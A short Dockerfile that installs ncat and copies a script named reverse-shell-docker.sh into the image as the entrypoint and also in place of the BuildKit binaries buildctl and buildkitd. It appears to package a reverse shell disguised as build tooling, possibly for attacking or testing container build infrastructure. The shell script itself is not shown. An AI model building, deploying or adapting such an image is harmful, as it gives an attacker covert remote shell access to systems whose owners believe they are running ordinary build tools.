FROM debian:latest

# Install nc
RUN apt-get update && apt-get install -y ncat

COPY reverse-shell-docker.sh /entry.sh
COPY reverse-shell-docker.sh /bin/buildctl
COPY reverse-shell-docker.sh /bin/buildkitd

ENTRYPOINT /entry.sh
